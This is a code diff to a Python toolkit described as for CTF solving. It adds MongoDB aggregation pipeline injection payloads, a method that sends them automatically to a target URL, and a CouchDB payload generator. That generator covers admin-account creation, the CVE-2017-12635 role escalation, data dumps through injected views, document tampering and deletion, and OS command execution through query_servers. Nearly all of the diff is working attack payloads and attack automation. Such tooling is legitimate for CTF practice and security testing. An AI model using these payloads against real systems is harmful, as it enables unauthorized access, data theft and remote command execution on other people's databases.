@@ -1,7 +1,8 @@
 """
 NoSQL Injection testing tools for CTF solving.
 
-Provides automated MongoDB-style NoSQL injection detection and payload generation.
+Provides automated MongoDB-style NoSQL injection detection, aggregation
+pipeline injection, and CouchDB-specific payload generation.
 """
 
 import json
@@ -73,6 +74,27 @@ class NosqlProbeTool:
         ("this.password.match(/.*/)", "$where regex match"),
         ("function(){return true}", "$where function true"),
         ("1==1", "$where equality true"),
+    ]
+
+
+    # Aggregation pipeline injection payloads
+    AGGREGATION_PAYLOADS: List[Tuple[dict, str]] = [
+        (
+            {"$lookup": {"from": "users", "localField": "_id", "foreignField": "_id", "as": "leaked"}},
+            "$lookup cross-collection data extraction",
+        ),
+        (
+            {"$addFields": {"isAdmin": True}},
+            "$addFields inject computed fields",
+        ),
+        (
+            {"$group": {"_id": None, "$push": "$$ROOT"}},
+            "$group + $push aggregate all documents",
+        ),
+        (
+            {"$match": {"$where": "return true"}},
+            "$match with $where JavaScript execution",
+        ),
     ]
 
     # NoSQL error indicators
@@ -392,6 +414,90 @@ class NosqlProbeTool:
 
         return interesting, errors_found, flags_found
 
+    def _test_aggregation_injection(
+        self,
+        url: str,
+        method: str,
+        param: str,
+        form_data: Dict,
+        timeout: int,
+        baseline_status: int,
+        baseline_length: int,
+    ) -> Tuple[List[Dict], List[str], List[str]]:
+        """Test aggregation pipeline injection payloads ($lookup, $addFields, etc.)."""
+        interesting = []
+        errors_found = []
+        flags_found = []
+
+        for payload_obj, desc in self.AGGREGATION_PAYLOADS:
+            json_data = dict(form_data)
+            json_data[param] = payload_obj
+
+            try:
+                if method == "GET":
+                    resp = self.session.get(
+                        url,
+                        params={param: json.dumps(payload_obj)},
+                        timeout=timeout,
+                    )
+                else:
+                    resp = self.session.post(url, json=json_data, timeout=timeout)
+
+                resp_text = resp.text
+                resp_length = len(resp_text)
+                resp_status = resp.status_code
+
+                nosql_errors = self._detect_errors(resp_text)
+                success_indicators = self._detect_success(resp_text)
+                flag = self._extract_flag(resp_text)
+
+                is_interesting = False
+                reasons = []
+
+                if nosql_errors:
+                    is_interesting = True
+                    reasons.append(f"NoSQL errors: {', '.join(nosql_errors)}")
+                    errors_found.extend(nosql_errors)
+
+                if success_indicators:
+                    is_interesting = True
+                    reasons.append(
+                        f"Success indicators: {', '.join(success_indicators)}"
+                    )
+
+                length_diff = abs(resp_length - baseline_length)
+                if length_diff > 100 and resp_length > baseline_length:
+                    is_interesting = True
+                    reasons.append(f"Length diff: +{length_diff} bytes")
+
+                if resp_status != baseline_status and resp_status == 200:
+                    is_interesting = True
+                    reasons.append(
+                        f"Status changed: {baseline_status} -> {resp_status}"
+                    )
+
+                if flag:
+                    is_interesting = True
+                    reasons.append(f"FLAG FOUND: {flag}")
+                    flags_found.append(flag)
+
+                if is_interesting:
+                    interesting.append(
+                        {
+                            "payload": json.dumps(payload_obj),
+                            "type": "aggregation",
+                            "desc": desc,
+                            "status": resp_status,
+                            "length": resp_length,
+                            "reasons": reasons,
+                        }
+                    )
+
+            except Exception:
+                pass
+
+        return interesting, errors_found, flags_found
+
     def use(self, tool_input: str) -> str:
         # Parse JSON input
         try:
@@ -464,6 +570,16 @@ class NosqlProbeTool:
         all_interesting.extend(interesting)
         all_errors.extend(errors)
         all_flags.extend(flags)
+
+        # Test aggregation pipeline injection (always tested with JSON body)
+        if injection_type in ("json_body", "both"):
+            interesting, errors, flags = self._test_aggregation_injection(
+                url, method, param, form_data, timeout,
+                baseline_status, baseline_length,
+            )
+            all_interesting.extend(interesting)
+            all_errors.extend(errors)
+            all_flags.extend(flags)
 
         # Build output
         output_lines = [
@@ -553,16 +669,17 @@ class NosqlPayloadGenerator:
       - auth_bypass: Complete login bypass payloads for MongoDB
       - data_extraction: Regex-based character extraction methodology
       - operators: Reference of all MongoDB query operators
+      - couchdb: CouchDB-specific payloads and techniques
     """
 
     name: str = "nosql_payload_generator"
     description: str = (
-        "Generate MongoDB NoSQL injection payloads for common attack scenarios. "
-        "Input must be JSON with key 'operation': 'auth_bypass' (login bypass payloads in "
-        "both query param and JSON formats), 'data_extraction' (regex-based blind extraction "
-        "templates), or 'operators' (MongoDB operator reference). Optional: 'target_field' "
-        "(field name to target), 'known_prefix' (known prefix for data extraction). "
-        "No HTTP session needed - pure payload generation."
+        "Generate NoSQL injection payloads for common attack scenarios. "
+        "Input must be JSON with key 'operation': 'auth_bypass' (MongoDB login bypass), "
+        "'data_extraction' (regex-based blind extraction), 'operators' (MongoDB operator "
+        "reference), or 'couchdb' (CouchDB-specific payloads and techniques). Optional: "
+        "'target_field' (field name to target), 'known_prefix' (known prefix for data "
+        "extraction). No HTTP session needed - pure payload generation."
     )
 
     # MongoDB query operators reference
@@ -797,16 +914,17 @@ class NosqlPayloadGenerator:
             return f"[NosqlPayloadGenerator] Error: Invalid JSON input. {exc}"
 
         operation = data.get("operation", "").strip()
+        valid_ops = ("auth_bypass", "data_extraction", "operators", "couchdb")
         if not operation:
             return (
                 "[NosqlPayloadGenerator] Error: 'operation' is required. "
-                "Must be 'auth_bypass', 'data_extraction', or 'operators'."
+                f"Must be one of: {', '.join(valid_ops)}."
             )
 
-        if operation not in ("auth_bypass", "data_extraction", "operators"):
+        if operation not in valid_ops:
             return (
                 f"[NosqlPayloadGenerator] Error: Invalid operation '{operation}'. "
-                "Must be 'auth_bypass', 'data_extraction', or 'operators'."
+                f"Must be one of: {', '.join(valid_ops)}."
             )
 
         target_field = data.get("target_field")
@@ -828,4 +946,64 @@ class NosqlPayloadGenerator:
         elif operation == "operators":
             output_lines.append(self._generate_operators_reference())
 
+        elif operation == "couchdb":
+            output_lines.append(self._generate_couchdb_payloads())
+
         return "\n".join(output_lines)
+
+    def _generate_couchdb_payloads(self) -> str:
+        """Generate CouchDB-specific injection payloads."""
+        lines = [
+            "=== CouchDB-Specific Payloads ===",
+            "",
+            "--- Endpoint Discovery ---",
+            "  GET /          -> Server info (version, etc.)",
+            "  GET /_all_dbs  -> List all databases",
+            "  GET /{db}/_all_docs  -> List all documents",
+            "  GET /{db}/_all_docs?include_docs=true  -> All docs with content",
+            "  GET /_config    -> Server configuration (admin party check)",
+            "  GET /_users/_all_docs  -> User database",
+            "  GET /_session   -> Current session info",
+            "",
+            "--- Authentication Bypass ---",
+            "",
+            "1. Admin Party (no admin configured):",
+            "   PUT /_config/admins/hacker -d '\"password\"'",
+            "   (Creates a new admin account if admin party is enabled)",
+            "",
+            "2. Cookie authentication bypass:",
+            '   POST /_session -d \'{"name":"admin","password":"admin"}\'',
+            "   -H 'Content-Type: application/json'",
+            "",
+            "--- View-Based Data Extraction ---",
+            "",
+            "3. Mango query injection (CouchDB 2.x+):",
+            '   POST /{db}/_find -d \'{"selector": {"$gt": null}}\'',
+            '   POST /{db}/_find -d \'{"selector": {"password": {"$regex": ".*"}}}\'',
+            "",
+            "4. JavaScript view injection (if views enabled):",
+            '   PUT /{db}/_design/exploit -d \'{"views":{"dump":{"map":"function(doc){emit(doc._id,doc)}"}}}\'',
+            "   GET /{db}/_design/exploit/_view/dump",
+            "",
+            "--- Document Manipulation ---",
+            "",
+            "5. Create/modify documents:",
+            '   PUT /{db}/evil_doc -d \'{"admin": true, "role": "admin"}\'',
+            '   POST /{db} -d \'{"_id": "admin", "password": "hacked"}\'',
+            "",
+            "6. Delete documents (with revision):",
+            "   DELETE /{db}/{doc_id}?rev={revision}",
+            "",
+            "--- CouchDB Erlang RCE (CVE-2017-12635/12636) ---",
+            "",
+            "7. Privilege escalation (duplicate roles):",
+            '   PUT /_users/org.couchdb.user:evil -d \'{"type":"user",'
+            '"name":"evil","roles":["_admin"],"roles":[],"password":"pass"}\'',
+            "   (Duplicate 'roles' key exploit in older versions)",
+            "",
+            "8. OS command execution (CouchDB < 3.x with config access):",
+            "   PUT /_config/query_servers/cmd -d '\"id >/tmp/out\"'",
+            "   POST /{db}/_temp_view?limit=1 -d "
+            "'{\"language\":\"cmd\",\"map\":\"\"}'",
+        ]
+        return "\n".join(lines)
